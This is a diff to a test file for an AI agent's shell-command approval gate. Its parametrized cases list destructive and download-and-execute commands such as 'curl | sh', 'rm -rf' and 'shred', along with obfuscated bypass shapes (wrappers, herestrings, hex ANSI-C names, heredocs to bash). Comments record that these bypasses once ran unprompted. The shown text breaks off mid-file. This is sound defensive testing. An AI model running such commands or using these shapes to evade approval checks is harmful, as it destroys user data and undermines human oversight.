@@ -10,6 +10,7 @@ gate short-circuits before Popen. That is asserted explicitly, not assumed.
 """
 from __future__ import annotations
 
+import os
 import shlex
 import time
 from pathlib import Path
@@ -22,6 +23,34 @@ from external_llm.agent.tool_handlers.shell_policy import (
     SHELL_TIMEOUT_DEFAULT,
     SHELL_TIMEOUT_MAX,
 )
+
+
+class _InstantPopen:
+    """A command that produced nothing and exited successfully.
+
+    The bash tool polls the pipe fds directly now (bounded head+tail capture
+    instead of ``communicate()``), so a stand-in has to BE two file objects at
+    EOF rather than a method returning ``("", "")``. Real pipes, so the poll,
+    the reads and the close all behave as they do in production.
+    """
+
+    def __init__(self):
+        self.returncode = 0
+        self.pid = os.getpid()
+        self.stdout = self._eof_pipe()
+        self.stderr = self._eof_pipe()
+
+    @staticmethod
+    def _eof_pipe():
+        _r, _w = os.pipe()
+        os.close(_w)
+        return os.fdopen(_r, "r", encoding="utf-8", errors="replace")
+
+    def wait(self, timeout=None):
+        return self.returncode
+
+    def poll(self):
+        return self.returncode
 
 
 class _Recorder:
@@ -46,20 +75,26 @@ def gate(tool_registry, monkeypatch):
         tool_registry, "_request_shell_danger_approval", _deny, raising=True
     )
 
-    class _FakePopen:
+    class _FakePopen(_InstantPopen):
         """Stands in for a successful, instant command."""
 
         def __init__(self, command, *a, **kw):
             # The command reaching Popen carries the macOS capability shim
             # prelude (_apply_shell_shims), so tests match on the tail.
             rec.spawned.append(command)
-            self.returncode = 0
-
-        def communicate(self, timeout=None):
-            rec.timeout = timeout
-            return ("", "")
+            super().__init__()
 
     monkeypatch.setattr(gt_mod.subprocess, "Popen", _FakePopen)
+
+    # The clamped budget is consumed by the pipe pump, not handed to a single
+    # blocking call, so it is recorded at the pump's boundary.
+    _real_capture = gt_mod.ShellToolsMixin._capture_bounded
+
+    def _spy(self, proc, timeout, cap):
+        rec.timeout = timeout
+        return _real_capture(self, proc, timeout, cap)
+
+    monkeypatch.setattr(gt_mod.ShellToolsMixin, "_capture_bounded", _spy)
     tool_registry._recorder = rec
     return tool_registry
 
@@ -348,10 +383,17 @@ def test_forbidden_flag_is_scoped_to_its_own_segment(gate):
     ],
 )
 def test_timeout_is_clamped_to_the_advertised_range(gate, requested, expected):
+    """The clamped budget is what bounds the wait, however that wait is sliced.
+
+    Asserted at the pipe pump's boundary, which receives the whole budget and
+    then slices it internally for the cancel poll. Reading it there rather than
+    off one slice means the assertion does not have to be told what the slicing
+    interval is.
+    """
     args = {} if requested is None else {"timeout": requested}
     result = _run(gate, "echo hi", **args)
     assert result.ok
-    assert gate._recorder.timeout == expected
+    assert gate._recorder.timeout == pytest.approx(expected, abs=1.0)
 
 
 def test_schema_advertises_the_enforced_bounds():
@@ -413,10 +455,22 @@ def test_the_previously_truncated_real_command_is_now_fully_visible():
         ("git clean -fd", "git"),             # bundle without -x
         ("git clean -f -d -x", "git"),        # separate short flags
         ("git push --force origin main", "git"),
+        ("git push -f origin main", "git"),   # short form of --force
+        ("git clean -f", "git"),              # short form alone (not bundled)
         ("git checkout -- .", "git"),
+        ("git checkout .", "git"),            # discards uncommitted edits
+        ("git checkout -f branch", "git"),    # force-switch discarding changes
         ("git restore -- src/", "git"),
+        ("git restore .", "git"),             # modern equivalent of checkout .
+        ("git restore -W .", "git"),          # BSD-compat worktree restoration
+        ("git branch -f main HEAD~5", "git"), # force-reassign a branch ref
         ("find . -name '*.py' -delete", "find"),
         ("truncate -s 0 sample.py", "truncate"),
+        ("truncate -s0 sample.py", "truncate"),         # glued short flag
+        ("truncate -s0K sample.py", "truncate"),        # zero with SI suffix
+        ("truncate --size=0 sample.py", "truncate"),    # long flag with =
+        ("truncate --size 0 sample.py", "truncate"),    # long flag separate
+        ("truncate --size 0M sample.py", "truncate"),   # long flag + SI suffix
         ("ls && git reset --hard", "git"),    # combo in a later segment
     ],
 )
@@ -441,6 +495,15 @@ def test_destructive_flag_combos_require_approval(gate, command, expected):
         "git push --force-with-lease origin x",   # the SAFE alternative
         "git diff -- src/main.py",            # `--` without checkout/restore
         "git checkout -b feature/x",          # branch creation destroys nothing
+        # -f with non-destructive subcommands must not fire
+        "git add -f file.py",                 # force-add, not destructive
+        "git remote add -f origin url",       # fetch, not destructive
+        "git fetch -f origin",                # fetch is read-only
+        # truncate with non-zero size
+        "truncate -s 10 sample.py",           # not zero
+        "truncate -s 1K sample.py",           # 1K is not zero
+        # Flag=value in prose (git commit message) must not be mis-split
+        "git commit -m 'x=--hard'",
     ],
 )
 def test_flag_combos_do_not_fire_on_unrelated_commands(gate, command):
@@ -458,6 +521,65 @@ def test_bundled_short_flags_expand_to_their_letters():
     # `--force` must NOT be reached by expanding a long flag letter-by-letter.
     assert not _segment_flag_combo_hit("git", ["push", "--force-with-lease"])
     assert not _segment_flag_combo_hit("git", ["status", "-s"])
+
+
+def test_flag_value_glue_is_normalised_before_combo_check():
+    """Glued --flag=value and -sVALUE should be split so combos see both halves."""
+    from external_llm.agent.tool_handlers.git_tools import _segment_flag_combo_hit
+
+    # --flag=value: split so {"--size","0"} matches
+    assert _segment_flag_combo_hit("truncate", ["--size=0", "file"])
+    assert _segment_flag_combo_hit("truncate", ["--size", "0", "file"])
+
+    # Short flag with glued value: -s0 → -s + 0
+    assert _segment_flag_combo_hit("truncate", ["-s0", "file"])
+    assert _segment_flag_combo_hit("truncate", ["-s0K", "file"])
+
+    # Bundled interpretation still works alongside glue normalisation
+    assert _segment_flag_combo_hit("git", ["clean", "-fdx"])
+
+    # --flag with non-numeric value must NOT be mis-split
+    assert not _segment_flag_combo_hit("git", ["--force-with-lease"])
+
+
+def test_zero_size_suffixes_are_canonicalised():
+    """0K, 0M, 0G etc. are all 'file truncated to zero bytes'."""
+    from external_llm.agent.tool_handlers.git_tools import _segment_flag_combo_hit
+
+    for suffix in ["0", "0K", "0k", "0M", "0m", "0G", "0T", "0P"]:
+        assert _segment_flag_combo_hit("truncate", ["-s", suffix, "f"]), (
+            f"zero-size suffix {suffix!r} was NOT matched"
+        )
+
+    # Non-zero size must NOT match — 1K is not zero
+    assert not _segment_flag_combo_hit("truncate", ["-s", "1", "f"])
+    assert not _segment_flag_combo_hit("truncate", ["-s", "1K", "f"])
+    assert not _segment_flag_combo_hit("truncate", ["-s", "10M", "f"])
+
+    # A suffix alone without the flag must NOT match
+    assert not _segment_flag_combo_hit("truncate", ["0K", "f"])
+
+
+def test_subcommand_scoped_combos_unit():
+    """Verify the subcommand-scoped combos at the flag-combo level."""
+    from external_llm.agent.tool_handlers.git_tools import _segment_flag_combo_hit
+
+    # git push -f (short form of --force)
+    assert _segment_flag_combo_hit("git", ["push", "-f"])
+    # git clean -f (short form alone)
+    assert _segment_flag_combo_hit("git", ["clean", "-f"])
+    # git checkout .  /  git checkout -f
+    assert _segment_flag_combo_hit("git", ["checkout", "."])
+    assert _segment_flag_combo_hit("git", ["checkout", "-f"])
+    # git restore .  /  git restore -W
+    assert _segment_flag_combo_hit("git", ["restore", "."])
+    assert _segment_flag_combo_hit("git", ["restore", "-W"])
+    # git branch -f
+    assert _segment_flag_combo_hit("git", ["branch", "-f"])
+
+    # git add -f must NOT fire — -f without the right subcommand is harmless
+    assert not _segment_flag_combo_hit("git", ["add", "-f", "file"])
+    assert not _segment_flag_combo_hit("git", ["remote", "add", "-f"])
 
 
 # ── quoted separators are literal, not segment boundaries ─────────────────
@@ -497,10 +619,11 @@ def test_repeated_token_resolves_to_its_own_occurrence(gate):
 # ── truncating output redirection ─────────────────────────────────────────
 
 
-@pytest.mark.parametrize("template", ["> {f}", "echo '' > {f}", "cat /dev/null > {f}", "ls && echo x > {f}"])
+@pytest.mark.parametrize("template", ["> {f}", "echo '' > {f}", "cat /dev/null > {f}", "ls && echo x > {f}", "echo '' >| {f}", ">| {f}"])
 def test_truncating_redirect_over_an_existing_repo_file_requires_approval(gate, template):
     """`echo '' > src/main.py` destroys a file as thoroughly as `rm` does, but
-    no *executable* in it is dangerous, so the name gate cannot see it."""
+    no *executable* in it is dangerous, so the name gate cannot see it.
+    `>|` (noclobber override) is equally a truncating write."""
     command = template.format(f="sample.py")   # created by the temp_repo_root fixture
     result = _run(gate, command)
     assert gate._recorder.asked, f"no approval requested for: {command}"
@@ -514,9 +637,11 @@ def test_truncating_redirect_over_an_existing_repo_file_requires_approval(gate, 
     "command",
     [
         "echo hi > brand_new_file.txt",       # target does not exist — creates it
+        "echo hi >| brand_new_file.txt",      # noclobber to new file — same as >
         "echo hi >> sample.py",               # append, not truncate
         "python3 -m pytest -q 2>/dev/null",   # /dev/null is not a repo file
         "cat sample.py > /tmp/copy.py",       # outside the repo
+        "cat sample.py >| /tmp/copy.py",      # noclobber outside the repo
         "cat < sample.py",                    # input redirection
         "grep x sample.py 2>&1",              # fd duplication, not a file
     ],
@@ -524,6 +649,53 @@ def test_truncating_redirect_over_an_existing_repo_file_requires_approval(gate, 
 def test_non_truncating_redirects_are_not_gated(gate, command):
     _run(gate, command)
     assert gate._recorder.asked == [], f"spurious approval prompt for: {command}"
+
+
+# ── a separator glued to a redirect TARGET still ends the segment ─────────
+#
+# The `>|` exemption in _split_shell_separators keys off _REDIRECT_RE, whose
+# tail group is `.*` and therefore swallows anything after the operator —
+# including a separator. `echo hi >out.txt;rm -rf /` reaches shlex as the single
+# token `>out.txt;rm`, so an unconditional exemption skipped the split and left
+# `rm` out of the executable slot: measured running unprompted for all three
+# spellings. Writing `;` without surrounding spaces is ordinary shell style, so
+# this is not a contrived shape.
+#
+# Every `>|` test above puts a SPACE between the operator and the filename,
+# which is exactly why none of them could see this: the token has no separator
+# of its own. These cases carry one.
+
+
+@pytest.mark.parametrize(
+    "command,expected",
+    [
+        ("echo hi >out.txt;rm -rf victim_dir", "rm"),
+        ("echo hi >out.txt&&rm -rf victim_dir", "rm"),
+        ("echo hi >out.txt|xargs rm -rf", "rm"),
+        ("echo hi >|out.txt;rm -rf victim_dir", "rm"),
+        # The `<` and `>>` operators reach the same exemption branch.
+        ("cat <in.txt;rm -rf victim_dir", "rm"),
+        ("echo hi >>out.txt;pkill -f pytest", "pkill"),
+    ],
+)
+def test_separator_glued_to_a_redirect_target_still_splits(gate, command, expected):
+    _run(gate, command)
+    assert gate._recorder.asked, f"command after a glued separator was not gated: {command}"
+    assert expected in gate._recorder.asked[0][0]
+    assert gate._recorder.spawned == []
+
+
+def test_glued_noclobber_target_is_still_one_token(gate):
+    """`>|sample.py` (no space) must keep working — the exemption's whole point.
+
+    Guards the fix above from being tightened into uselessness: this token
+    contains a `|` but no separator of its own, so it stays intact and the
+    truncation target is still recovered.
+    """
+    _run(gate, "echo '' >|sample.py")
+    assert gate._recorder.asked, "glued `>|` truncation was not gated"
+    assert "truncates" in gate._recorder.asked[0][0]
+    assert "sample.py" in gate._recorder.asked[0][0]
 
 
 # ── implicit command boundaries: newline and subshell parens ──────────────
@@ -1322,3 +1494,848 @@ class TestVerificationCommandDetection:
         assert is_verification_command(cmd) is False, (
             f"'{cmd}' should NOT be recognised as a verification command"
         )
+
+
+# ── Command wrappers that were absent from COMMAND_WRAPPERS ───────────────
+# Same executable-slot-swallowing shape `sudo`/`nohup`/`xargs` were listed for.
+# All measured running unprompted before these entries existed.
+
+
+@pytest.mark.parametrize(
+    "command,expected",
+    [
+        # direct wrappers
+        ("parallel rm -rf ::: /tmp/x", "rm"),
+        ("parallel -j 4 rm -rf ::: /tmp/x", "rm"),   # -j takes a value
+        ("unbuffer rm -rf /tmp/x", "rm"),
+        ("watch rm -rf /tmp/x", "rm"),
+        ("watch -n 2 rm -rf /tmp/x", "rm"),          # -n takes a value
+        ("runuser -u nobody rm -rf /tmp/x", "rm"),   # -u takes a value
+        # positional operand before the command
+        ("flock /tmp/l rm -rf /tmp/x", "rm"),
+        ("flock -w 5 /tmp/l rm -rf /tmp/x", "rm"),   # flag value AND operand
+        ("script -q /dev/null rm -rf /tmp/x", "rm"), # BSD spelling
+        # `-c` payloads handed to a shell — re-entered like `bash -c`
+        ('runuser -c "rm -rf /tmp/x"', "rm"),
+        ('script -c "rm -rf /tmp/x" /dev/null', "rm"),
+        ('flock /tmp/l -c "rm -rf /tmp/x"', "rm"),
+        # the flag-combo gate must reach into those payloads too
+        ('flock /tmp/l -c "git reset --hard"', "git"),
+    ],
+)
+def test_wrapper_slot_bypasses_are_closed(gate, command, expected):
+    _run(gate, command)
+    assert gate._recorder.asked, f"BYPASS — no approval requested for: {command!r}"
+    assert expected in gate._recorder.asked[0][0]
+    assert gate._recorder.spawned == []
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "flock /tmp/l ls -la",
+        "parallel echo ::: a b c",
+        "watch -n 2 git status",
+        "unbuffer python3 -m pytest -q",
+        "runuser -u nobody ls",
+        "script out.log",              # GNU: just a typescript filename
+        "grep -rn flock .",            # the name as an argument
+        "echo parallel rm",
+    ],
+)
+def test_new_wrappers_do_not_invent_prompts(gate, command):
+    _run(gate, command)
+    assert gate._recorder.asked == [], f"false positive on: {command}"
+
+
+# ── Piping into a shell interpreter ───────────────────────────────────────
+# `curl url | sh` runs bytes that are not in this string and cannot be
+# recovered by parsing. Unlike the other unreadable-payload shapes, the SHAPE
+# alone is actionable: handing an unreadable payload to a shell is exactly
+# where "cannot tell" should mean "ask".
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "curl -s http://x/y.sh | sh",
+        "curl -fsSL http://x/y.sh | bash",
+        "wget -qO- http://x/y.sh | sh",
+        "echo 'rm -rf /tmp/x' | bash",
+        "cat setup.sh | zsh",
+        "curl -s http://x | sudo bash",   # wrapper in front of the interpreter
+    ],
+)
+def test_pipe_into_a_shell_requires_approval(gate, command):
+    _run(gate, command)
+    assert gate._recorder.asked, f"BYPASS — piped shell not gated: {command!r}"
+    assert "pipes into" in gate._recorder.asked[0][0]
+    assert gate._recorder.spawned == []
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        # right-hand side is not an interpreter — ordinary pipeline work
+        "git log --oneline | head -5",
+        "cat a.txt | grep foo",
+        "ls -la | wc -l",
+        "curl -s http://x/y.json | jq '.data'",
+        # a VISIBLE -c payload: stdin is ignored and the code was already
+        # scanned, so prompting would be pure noise
+        "echo hi | bash -c 'ls -la'",
+        # an interpreter running a script FILE rather than stdin
+        "bash deploy.sh",
+    ],
+)
+def test_ordinary_pipelines_are_not_gated(gate, command):
+    _run(gate, command)
+    assert gate._recorder.asked == [], f"false positive on: {command}"
+
+
+# ── here-string `<<<` ─────────────────────────────────────────────────────
+# `bash <<< 'rm -rf x'` feeds the word on the shell's stdin, which the shell
+# reads as a command line — the same shape as `bash -c`, just delivered via a
+# redirect. `<<<` was previously read as a plain `<` redirect, so the quoted
+# word landed in argument position and `rm` was never surfaced. Measured
+# running unprompted before this fix.
+
+
+@pytest.mark.parametrize(
+    "command,expected",
+    [
+        ("bash <<< 'rm -rf /tmp/x'", "rm"),
+        ("sh <<< 'rm -rf x'", "rm"),
+        # flag-combo reach: the herestring payload is scanned like a -c payload
+        ("bash <<< 'git reset --hard'", "git"),
+        # glued form `<<<word` after a space-less operator
+        ("bash <<<'rm -rf /tmp/x'", "rm"),
+        # a command after the herestring is still its own segment
+        ("bash <<< 'rm -rf x'; echo done", "rm"),
+    ],
+    ids=["bash-hs-rm", "sh-hs-rm", "bash-hs-git-combo", "glued-hs-rm", "hs-then-echo"],
+)
+def test_herestring_payload_to_a_shell_is_scanned(gate, command, expected):
+    _run(gate, command)
+    assert gate._recorder.asked, (
+        f"BYPASS — herestring payload to a shell not gated: {command!r}"
+    )
+    assert expected in gate._recorder.asked[0][0]
+    assert gate._recorder.spawned == []
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        # `cat` reads the herestring and prints it; it does not EXECUTE it, so
+        # gating would be a false positive (and would train reflexive approval).
+        "cat <<< 'rm -rf x'",
+        # an interpreter with NO herestring just runs a script file
+        "bash deploy.sh",
+    ],
+    ids=["cat-hs-literal", "no-hs-script-file"],
+)
+def test_herestring_to_a_non_shell_is_not_gated(gate, command):
+    _run(gate, command)
+    assert gate._recorder.asked == [], f"false positive on herestring: {command!r}"
+
+
+# ── ANSI-C `$'...'` inside a double-quoted command substitution ───────────
+# The body of a `"$( ... )"` is an UNQUOTED command line (bash semantics), so
+# `$'rm'` there is ANSI-C quoting and decodes to `rm` — which shlex would
+# otherwise read as the variable-looking token `$rm`. Before this fix the body
+# was emitted verbatim, so `echo "$($'rm' x)"` ran unprompted.
+
+
+@pytest.mark.parametrize(
+    "command,expected",
+    [
+        ('echo "$($\'rm\' /tmp/x)"', "rm"),
+        # hex-obfuscated name hidden inside the double-quoted cmdsub body
+        ('echo "$($\'\\x72\\x6d\' /tmp/x)"', "rm"),
+        # ANSI-C naming inside a double-quoted backtick body (the body is an
+        # unquoted command line, so `$'rm'` decodes to the executable `rm`).
+        ('echo "`$\'rm\' /tmp/x`"', "rm"),
+    ],
+    ids=["dq-cmdsub-ansic-rm", "dq-cmdsub-ansic-hex", "dq-backtick-ansic-rm"],
+)
+def test_ansi_c_inside_double_quoted_substitution_is_gated(gate, command, expected):
+    _run(gate, command)
+    assert gate._recorder.asked, (
+        f"BYPASS — ANSI-C inside dq substitution not gated: {command!r}"
+    )
+    assert expected in gate._recorder.asked[0][0]
+    assert gate._recorder.spawned == []
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        # In NORMAL double-quoted text (no active substitution) `$'...'` is
+        # literal prose, not ANSI-C — gating it would be a false positive.
+        'echo "dont $\'panic\' here"',
+        'echo "the token $\'rm\' is just text"',
+    ],
+    ids=["dq-ansic-prose", "dq-ansic-rm-as-text"],
+)
+def test_ansi_c_in_plain_double_quotes_stays_literal(gate, command):
+    _run(gate, command)
+    assert gate._recorder.asked == [], (
+        f"false positive — $'...' in plain double quotes treated as ANSI-C: {command!r}"
+    )
+
+
+# ── secure / unrecoverable file erasure ───────────────────────────────────
+# `shred` overwrites a file in place (`-u` deletes afterwards) and `srm` is the
+# secure-delete equivalent. Both are unrecoverable erasure in the dd/mkfs
+# category — an agent never legitimately needs them, so they prompt on the
+# executable name alone.
+
+
+@pytest.mark.parametrize(
+    "command,expected",
+    [
+        ("shred /tmp/secret", "shred"),
+        ("shred -u /tmp/secret", "shred"),
+        ("shred -z -n 5 /tmp/secret", "shred"),
+        ("srm /tmp/secret", "srm"),
+    ],
+    ids=["shred", "shred-u", "shred-opts", "srm"],
+)
+def test_secure_erase_commands_are_gated(gate, command, expected):
+    _run(gate, command)
+    assert gate._recorder.asked, (
+        f"BYPASS — secure-erase command not gated: {command!r}"
+    )
+    assert expected in gate._recorder.asked[0][0]
+    assert gate._recorder.spawned == []
+# ── process substitution feeding a shell ──────────────────────────────────
+# `bash <(echo rm -rf x)` feeds the substitution's OUTPUT to the shell via a
+# FIFO. The substitution body (`echo rm -rf x`) is benign (echo is the
+# executable), but its OUTPUT (`rm -rf x\n`) is executed by the shell — the
+# same "unreadable payload" shape as `curl | sh`.  `diff <(rm -rf x) b` is
+# already caught (normalisation surfaces `rm`), but `bash <(echo rm ...)` leaks
+# because `echo` fills the executable slot and `rm` is just an argument.
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "bash <(echo rm -rf /tmp/x)",
+        "sh <(echo rm -rf /tmp/x)",
+        # wrapper in front of the interpreter
+        "sudo bash <(echo rm -rf /tmp/x)",
+        # process substitution still feeds the shell when -c is absent
+        "bash <(echo 'rm -rf /tmp/x')",
+    ],
+    ids=["bash-procsub", "sh-procsub", "sudo-bash-procsub", "bash-procsub-quoted"],
+)
+def test_process_substitution_feeding_shell_is_gated(gate, command):
+    _run(gate, command)
+    assert gate._recorder.asked, (
+        f"BYPASS — process substitution feeding shell not gated: {command!r}"
+    )
+    assert "process substitution" in gate._recorder.asked[0][0]
+    assert gate._recorder.spawned == []
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        # `diff` is not a shell interpreter — but `rm` inside the substitution
+        # IS surfaced by normalisation and caught by the normal danger check.
+        # This test just confirms the process-substitution shape rule does NOT
+        # fire on a non-interpreter (the rm is caught elsewhere).
+        "diff <(ls) b",
+        # `cat` reads the substitution as a FILE, not as stdin to execute
+        "cat <(echo rm -rf /tmp/x)",
+    ],
+    ids=["diff-procsub-not-gated", "cat-procsub-not-gated"],
+)
+def test_process_substitution_feeding_non_interpreter_is_not_gated(gate, command):
+    _run(gate, command)
+    for asked in gate._recorder.asked:
+        assert "process substitution" not in asked[0], (
+            f"false positive — process substitution gate fired on non-interpreter: {command!r}"
+        )
+
+
+# ── process substitution is per-segment (not command-global) ──────────────
+# A procsub in one segment must not flag a shell interpreter in a DIFFERENT
+# segment.  `diff <(sort a) <(sort b) && bash build.sh` — the procsub feeds
+# `diff`, not `bash`, so bash should run unprompted.  This regression test
+# guards against the command-global _has_unquoted_procsub that the per-segment
+# token-stream detection replaced.
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        # procsub in segment 1 (diff), shell in segment 2 (bash) — no flag
+        "diff <(sort a) <(sort b) && bash build.sh",
+        # same with `;` separator
+        "diff <(sort a) b; sh deploy.sh",
+        # bare `< file` redirect in the same segment as shell — not a procsub
+        "bash < script.sh",
+        # stdin redirect with separate target — not a procsub
+        "python3 script.py < input.txt",
+    ],
+    ids=[
+        "diff-procsub-and-bash",
+        "diff-procsub-semi-sh",
+        "bash-redirect-file",
+        "python3-redirect-file",
+    ],
+)
+def test_procsub_per_segment_no_false_positive(gate, command):
+    _run(gate, command)
+    for asked in gate._recorder.asked:
+        assert "process substitution" not in asked[0], (
+            f"false positive — procsub gate fired across segment boundary: {command!r}"
+        )
+
+
+# ── the procsub `-c` suppression reads the SEGMENT, not the body ──────────
+# `_close_segment` runs with `_ti` already past the separator, so a forward
+# scan from there inspects the substitution BODY rather than the interpreter's
+# own segment. Every body below carries an ordinary `-c` flag that used to
+# silence the prompt — `curl -c` (cookie jar), `grep -c` (count) and a literal
+# `sh -c` as echo's data are all spellings an agent writes without contriving.
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "bash <(echo sh -c ls)",
+        "bash <(curl -c jar.txt http://x)",
+        "bash <(grep -c foo f)",
+        "sh <(wc -c file)",
+        "python3 <(sort -c data)",
+    ],
+    ids=[
+        "body-echo-sh-c",
+        "body-curl-cookie-jar",
+        "body-grep-count",
+        "body-wc-bytes",
+        "body-sort-check",
+    ],
+)
+def test_procsub_body_flag_does_not_suppress_prompt(gate, command):
+    _run(gate, command)
+    rec = gate._recorder
+    assert any("process substitution" in asked[0] for asked in rec.asked), (
+        f"a `-c` in the substitution BODY suppressed the prompt: {command!r}"
+    )
+    assert not rec.spawned, f"command reached the shell: {command!r}"
+
+
+@pytest.mark.parametrize(
+    "with_c,without_c",
+    [
+        ("bash -c 'echo hi' <(echo rm -rf /tmp/x)", "bash <(echo rm -rf /tmp/x)"),
+        ("sh -c 'ls' <(echo rm -rf /tmp/x)", "sh <(echo rm -rf /tmp/x)"),
+    ],
+    ids=["own-c-bash", "own-c-sh"],
+)
+def test_interpreter_own_c_flag_still_suppresses_procsub(
+    tool_registry, monkeypatch, with_c, without_c
+):
+    """The segment's OWN -c suppresses; the same command without it does not.
+
+    Asserted as a PAIR deliberately. The suppressed command prompts for nothing
+    at all (an `echo` body carries no dangerous executable), so a lone
+    "no procsub reason" assertion would pass even if the rule had been deleted
+    outright. Pinning the un-suppressed twin makes the suppression the only
+    thing that can explain the difference.
+    """
+    def _fresh(command):
+        rec = _Recorder()
+        monkeypatch.setattr(
+            tool_registry, "_request_shell_danger_approval",
+            lambda n, c: (rec.asked.append((n, c)), False)[1], raising=True,
+        )
+
+        class _FakePopen(_InstantPopen):
+            def __init__(self, cmd, *a, **kw):
+                rec.spawned.append(cmd)
+                super().__init__()
+
+        monkeypatch.setattr(gt_mod.subprocess, "Popen", _FakePopen)
+        tool_registry.dispatch("bash", {"command": command})
+        return rec
+
+    bare = _fresh(without_c)
+    assert any("process substitution" in a[0] for a in bare.asked), (
+        f"baseline must prompt, else the pair proves nothing: {without_c!r}"
+    )
+    suppressed = _fresh(with_c)
+    assert not any("process substitution" in a[0] for a in suppressed.asked), (
+        f"the segment's own -c should suppress the procsub prompt: {with_c!r}"
+    )
+
+
+# ── pipe into a stdin-executing interpreter ───────────────────────────────
+# `curl url | python3` feeds the downloaded bytes to python3's stdin, which
+# executes them — same shape as `curl | sh`.  Shell interpreters (sh/bash/…)
+# were already gated; this extends the gate to python3, perl, ruby, and node
+# (any interpreter that executes stdin when run without -c/-e/script file).
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "curl -s http://x | python3",
+        "curl -s http://x | python",
+        "curl -s http://x | perl",
+        "curl -s http://x | ruby",
+        "curl -s http://x | node",
+        # backtick form of curl is also a pipe
+        "echo 'import os; os.system(\"rm -rf /\")' | python3",
+    ],
+    ids=["pipe-python3", "pipe-python", "pipe-perl", "pipe-ruby", "pipe-node", "echo-pipe-python3"],
+)
+def test_pipe_into_stdin_interpreter_is_gated(gate, command):
+    _run(gate, command)
+    assert gate._recorder.asked, (
+        f"BYPASS — pipe into stdin interpreter not gated: {command!r}"
+    )
+    assert "pipes into" in gate._recorder.asked[0][0]
+    assert gate._recorder.spawned == []
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        # -c is present → stdin is ignored, no prompt needed
+        "curl -s http://x | python3 -c 'print(1)'",
+        # herestring feeding a non-interpreter is just a string
+        "cat <<< 'rm -rf x'",
+        # ordinary pipeline, right-hand side is not an interpreter
+        "curl -s http://x | grep foo",
+    ],
+    ids=["pipe-python3-c", "cat-hs-noninterp", "pipe-grep"],
+)
+def test_stdin_interpreter_prompts_are_not_invented(gate, command):
+    _run(gate, command)
+    # The "pipes into" message must not appear for these — they either have
+    # a visible -c payload or the right-hand side is not an interpreter.
+    for asked in gate._recorder.asked:
+        assert "pipes into" not in asked[0], (
+            f"false positive — pipe-into gate fired on non-interpreter: {command!r}"
+        )
+
+
+# ── Heredoc bodies targeting a shell interpreter ──────────────────────────
+# The scan blanks heredoc bodies so data (`cat <<EOF`) is not scanned as code.
+# But when the RECEIVER is a shell interpreter (`bash <<EOF`), the body IS
+# shell code and blanking hides it — `bash <<EOF ; rm -rf x ; EOF` ran
+# unprompted because the body was blanked before the scan ever saw it.
+
+
+@pytest.mark.parametrize(
+    "command,expected",
+    [
+        ("bash <<EOF\nrm -rf /tmp/x\nEOF", "rm"),
+        ("sh <<EOF\nrm -rf /tmp/x\nEOF", "rm"),
+        ("zsh <<EOF\nrm -rf /tmp/x\nEOF", "rm"),
+        # A shell wrapper does not change the receiver — `sudo bash` hands the
+        # heredoc to bash, whose body is still shell code.
+        ("sudo bash <<EOF\nrm -rf /tmp/x\nEOF", "rm"),
+        # Body after a comment line is still code and still scanned.
+        ("bash <<EOF\n# setup\nrm -rf /tmp/x\nEOF", "rm"),
+        # Body with a flag combo — effect gate, not just the name gate.
+        ("bash <<EOF\ngit reset --hard\nEOF", "git"),
+        # ── receiver is NOT the word immediately before `<<` ──────────────
+        # The receiver search must scan the whole opener-line prefix, not just
+        # its last word. Every case below puts a flag or redirect between the
+        # interpreter and `<<`, which a last-word reading misses — and
+        # `bash -s <<EOF` is the canonical spelling for feeding a script to
+        # bash, not a contrived one. All eight ran unprompted when the receiver
+        # was taken as the last word only.
+        ("bash -s <<EOF\nrm -rf /tmp/x\nEOF", "rm"),
+        ("bash -s <<'EOF'\nrm -rf /tmp/x\nEOF", "rm"),
+        ("bash -x <<EOF\nrm -rf /tmp/x\nEOF", "rm"),
+        ("bash -euo pipefail <<EOF\nrm -rf /tmp/x\nEOF", "rm"),
+        ("bash --norc <<EOF\nrm -rf /tmp/x\nEOF", "rm"),
+        # A redirect between the interpreter and `<<` is still not the receiver.
+        ("bash 2>/dev/null <<EOF\nrm -rf /tmp/x\nEOF", "rm"),
+        # Absolute path: the receiver is matched on its BASENAME, so
+        # `/bin/bash` is the same interpreter as `bash`.
+        ("/bin/bash -s <<EOF\nrm -rf /tmp/x\nEOF", "rm"),
+        # Wrapper AND flag together — neither occupies the receiver slot.
+        ("sudo bash -x <<EOF\nrm -rf /tmp/x\nEOF", "rm"),
+        # ── receiver resolved by the shared slot rules, not by word matching ──
+        # These need the wrapper tables (_segment_executable), not just a scan
+        # of the line's words: the interpreter is hidden behind a wrapper's
+        # flag VALUE, positional operand, numeric arg or an env assignment.
+        ("sudo -u me bash <<EOF\nrm -rf /tmp/x\nEOF", "rm"),
+        ("chroot /mnt bash <<EOF\nrm -rf /tmp/x\nEOF", "rm"),
+        ("timeout 5s bash <<EOF\nrm -rf /tmp/x\nEOF", "rm"),
+        ("nice -n 10 bash <<EOF\nrm -rf /tmp/x\nEOF", "rm"),
+        ("FOO=bar bash <<EOF\nrm -rf /tmp/x\nEOF", "rm"),
+        # `-c` belongs to `cat`, not to `bash` — the suppression is scoped to
+        # the RECEIVER's own segment, so bash's heredoc is still scanned.
+        ("cat -c f; bash <<EOF\nrm -rf /tmp/x\nEOF", "rm"),
+        # Trailing process substitution empties the final segment after
+        # normalisation (`<(cmd)` → `< ; cmd ;`); the receiver falls back to
+        # the nearest resolved executable rather than to nothing.
+        ("bash <(echo hi) <<EOF\nrm -rf /tmp/x\nEOF", "rm"),
+    ],
+    ids=[
+        "bash", "sh", "zsh", "sudo-bash", "comment-then-rm", "flag-combo",
+        "bash-s", "bash-s-quoted-delim", "bash-x", "bash-euo-pipefail",
+        "bash-norc", "bash-redirect-before-heredoc", "abs-path-bash-s",
+        "sudo-bash-x",
+        "sudo-u-value-flag", "chroot-positional", "timeout-numeric-arg",
+        "nice-value-flag", "env-assign-prefix", "dash-c-scoped-to-receiver",
+        "procsub-arg-before-heredoc",
+    ],
+)
+def test_heredoc_body_to_shell_interpreter_is_scanned(gate, command, expected):
